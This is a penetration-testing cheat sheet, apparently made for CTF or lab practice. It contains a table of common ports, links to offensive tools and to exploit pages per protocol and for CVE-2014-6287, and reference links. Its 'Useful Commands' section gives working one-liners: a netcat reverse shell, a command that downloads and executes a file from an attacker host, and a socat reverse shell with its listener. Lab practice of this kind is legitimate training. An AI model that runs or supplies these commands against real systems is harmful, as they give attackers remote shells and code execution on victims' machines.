# CheatSheet

## Ports
| Service | Port      |
|:-------:|:---------:|
| FTP     | 20 / 21   |
| SSH     | 22        |
| Telnet  | 23        |
| SMTP    | 25        |
| DNS     | 53        |
| HTTP    | 80        |
| POP3    | 110       |
| HTTPS   | 443       |
| SMB     | 139 / 445 |
| NFS     | 2049      |
| MySQL   | 3306      |

## Tools
- [Rustscan](rustscan.md)
- [Nmap](nmap.md)
- [MSFVenom](msfvenom.md)
- [Gobuster](gobuster.md)
- [Hydra](hydra.md)
- [John the Ripper](john.md)
- [Hashcat](hashcat.md)

## Exploit by protocol
- [SSH](ssh.md)
- [SMB](smb.md)
- [Telnet](telnet.md)
- [NFS](nfs.md)
- [FTP](ftp.md)
- [SMTP](smtp.md)
- [MySQL](mysql.md)

## Useful Commands
Generate shell payload
```
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
```

Download file from local Web server on kali
```
FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
```

### Socat
・Target Host  
```
wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4445
```

・Attacker (Kali)
```
socat file:`tty`,raw,echo=0 TCP-L:4445
```

Additional Settings :
```
export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
```

## CVEs
- CVE : 2014-6287 ([39161](cve-2014-6287-39161.md))
- CVE : 2014-6287 ([49125](cve-2014-6287-49125.md))


## Reference

Exploit DB  
https://www.exploit-db.com/

MSF Console Commands  
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

Meterpreter Commands  
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

GTFOBins  
https://gtfobins.github.io/

PayloadsAllTheThings / Reverse Shell Cheat Sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

PayloadsAllTheThings / Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries

CrackStation  
https://crackstation.net/

Hash Analyzer  
https://www.tunnelsup.com/hash-analyzer/

Upgrading Simple Shells to Fully Interactive TTYs  
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
